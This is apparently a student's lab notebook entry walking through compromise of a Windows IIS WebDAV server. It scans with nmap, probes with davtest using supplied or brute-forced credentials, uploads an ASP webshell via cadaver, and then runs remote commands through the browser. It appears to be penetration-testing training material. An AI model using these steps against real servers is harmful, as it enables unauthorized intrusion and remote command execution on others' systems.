>[!todo]- Steps of exploiting (win IIs webdav) :
>- 1-
>	- if you work from a different machine, you should know your ip first and the mac address..
>	- `ifconfig | ipconfig`
>---
>- 2-
>	- test connectivity of your picked target after the Recon operation
>	- we will assume that you have successfully found an ip address with suspect of having a vulnerability inside...
>	- `ping T_IP`
>		- to test if the target is up ..
>---
>- 3-
>	- `nmap t_ip`
>		- for testing the famous 1000 ports
>		- if no output, try the all 65535 then the udp one if necessary
>---
>- 4-
>	- now we have discovered multiple open ports
>	- we will focus on port 80, it has the targeted service
>	- `nmap --script http-enum -sV -p 80 T_IP`
>		- for making enumeration on a specific port on the target
>	- ![[Pasted image 20240712201243.png]]
>		- that is the type of answer you want to see to know if there are  that service or not...
>---
>- 5-
>	- using a specific tool named `davtest`
>	- `davtest -url http://t_ip/webdav`
>		- it will try to access the machine using webdav service
>		- it will give you failed because you don't have the authorized account, you will try a brute force here or just use the account they gave you :)
>---
>- 6-
>	- `davtest -auth name:pass --url http://t_ip/webdav`
>	- succeed to enter and you may enter some type of files as shown ...
>		- ![[Pasted image 20240712202211.png]]
>	- now you now that the target accept the connection with the account you type(given) and it accept specific files
>---
>- 7-
>	- now you try to send a webshell or a backdoor as u want...
>	- now we will use web shell by `cadaver`
>	- `cadaver http://t_ip/webdav`
>		- now it will ask for username and password ....
>		- now you have access the webdav folder that run a specific service
>---
>- 8-
>	- `put /usr/share/webshells/asp/webshell.asp`
>		- now you are trying to upload a webshell file to the target machine
>---
>- 9-
>	- now open the browser and open the web shell from it ...
>	- `http://t_ip/webdav/webshell.asp`
>		- it will ask for the authentication,
>		- now you have a remote command execution...
>----
>- 10-
>	- if you want to read a specific file
>	- use the windows commands to navigate inside and searching for the file...
>	- `type` command = `cat` in linux .....
